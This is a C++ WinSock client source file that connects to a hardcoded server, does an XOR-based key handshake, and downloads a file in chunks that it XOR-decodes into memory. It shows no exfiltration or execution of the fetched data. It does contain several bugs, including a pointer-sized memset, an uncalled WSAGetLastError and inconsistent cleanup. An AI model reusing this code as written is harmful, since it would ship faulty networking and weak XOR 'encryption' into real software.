#include "network.hpp"


SOCKET init_connection(char *key) {
	
	char buff[DEFAULT_BUFLEN];

	/* Initialize WinSock data */
	WSAData wsaData;
	SOCKET sock = INVALID_SOCKET;
	addrinfo* server_info = NULL, sockTypeSupport;
	int errorCheck;

	errorCheck = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (errorCheck != 0) {
		std::cerr << "WSAStartup failed with error " << errorCheck << std::endl;
		return INVALID_SOCKET;
	}

	/* Define recivable server sokcet type & resolve matching server address */
	ZeroMemory(&sockTypeSupport, sizeof(sockTypeSupport));
	sockTypeSupport.ai_family = AF_UNSPEC; // -> either ipv4/v6
	sockTypeSupport.ai_socktype = SOCK_STREAM;
	sockTypeSupport.ai_protocol = IPPROTO_TCP;

	errorCheck = getaddrinfo(HOST_IP, DEFAULT_PORT, &sockTypeSupport, &server_info);
	if (errorCheck != 0) {
		std::cerr << "getaddrinfo failed with error " << errorCheck << std::endl;
		WSACleanup();
		return INVALID_SOCKET;

	}

	/* Creating & Connecting */
	sock = socket(server_info->ai_family, server_info->ai_socktype, server_info->ai_protocol);
	if (sock == INVALID_SOCKET) {
		std::cerr << "socket failed with error " << WSAGetLastError() << std::endl;
		WSACleanup();
		return INVALID_SOCKET;
	}
	errorCheck = connect(sock, server_info->ai_addr, (int)server_info->ai_addrlen);
	freeaddrinfo(server_info);
	if (errorCheck == SOCKET_ERROR) {
		closesocket(sock);
		std::cerr << "unable to connect to server " << WSAGetLastError << std::endl;
		WSACleanup();
		return INVALID_SOCKET;
	}

	/* Start authentication routine */
	errorCheck = send(sock, "established connection", 23, 0);
	if (errorCheck == SOCKET_ERROR) {
		std::cerr << "send failed with error " << WSAGetLastError() << std::endl;
		closesocket(sock);
		WSACleanup();
		return INVALID_SOCKET;
	}

	// authenticate to the server
	errorCheck = recv(sock, buff, 10, 0);;
	if (errorCheck != 10) {
		std::cerr << "failed to get a valid key from server " << std::endl;
		return -1;
	}
	else {  
		// build the valid key
		for (int i = 0; i < 5; i++) {
			char temp = buff[i];
			key[i] = buff[10 - i - 1] ^ 27;
			key[10 - i - 1] = temp ^ 27;
		}
		errorCheck = send(sock, key, 10, 0);
		if (errorCheck == SOCKET_ERROR) {
			std::cerr << "send failed with error " << WSAGetLastError() << std::endl;
			closesocket(sock);
			WSACleanup();
			return INVALID_SOCKET;
		}
		else {
			errorCheck = recv(sock, buff, 27, 0);
			if (memcmp("Successfully Authenticated", buff, 27) == 0) {
				std::cout << "We managed to authenticate with the server " << std::endl;
			}
		}
	}

	return sock;
}

void enc_message(char* buff, char* key, int len) {

	for (int i = 0, key_index = 0; i < len; i++, key_index++) {
		if (key_index == 10) {
			key_index = 0;
		}
		buff[i] = buff[i] ^ key[key_index];
	}
}

int request_file(SOCKET sock, char* key , char *returnFile) {
	
	int returnBytes = 0;
	char buff[DEFAULT_BUFLEN];
	memset(returnFile, 0, sizeof(returnFile));

	for (int i = 0; i < NETWORK_CHUNKS; i++) {
		memcpy(buff, key, 10);
		buff[10] = i;
		returnBytes = send(sock, buff, 11, 0);
		if (returnBytes != 11 ) {
			std::cout << "[!] Cant send file request, Trying again... " << std::endl;
			i--;
			continue;
		}

		int totalBytesCounter = 0;
		char tmpBuilder[NETWORK_CHUNK_SIZE] = { 0 };
		bool retrievedKey = false;
		while (totalBytesCounter < NETWORK_CHUNK_SIZE) {
			returnBytes = recv(sock, buff + totalBytesCounter, NETWORK_CHUNK_SIZE - totalBytesCounter , 0);
			if (returnBytes == 0) {
				std::cout << "[!] Server Closed Connection , Trying again ..." << std::endl;
				break;
			}
			else if (returnBytes == -1) {
				std::cout << "[!] recv() failed, trying again..." << std::endl;
				break;
			}
			else if (returnBytes > NETWORK_CHUNK_SIZE || (returnBytes + totalBytesCounter) > (NETWORK_CHUNK_SIZE * NETWORK_CHUNKS)) {
				std::cout << "[!] Receive overflow, Retrying request for file chunk " << i << std::endl;
				break;
			}
			else {
				// fill the container untill a full size server response
				for (int j = 0; j < returnBytes; j++) {
					tmpBuilder[totalBytesCounter+j] = buff[j];
				}
				totalBytesCounter += returnBytes;
			}
			if (totalBytesCounter == NETWORK_CHUNK_SIZE) {
				retrievedKey = true;
				
			}
		} 
		
		if (!retrievedKey) {
			i--;
			continue;
		}

		enc_message(tmpBuilder, key, NETWORK_CHUNK_SIZE);
		for (int k = 0; k < NETWORK_CHUNK_SIZE; k++) {
			returnFile[(i * NETWORK_CHUNK_SIZE) + k ] = tmpBuilder[k];
		}

	}  
		 
	return 0;
}







int kill_connection(SOCKET sock) {

    if ( (shutdown(sock, SD_SEND)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}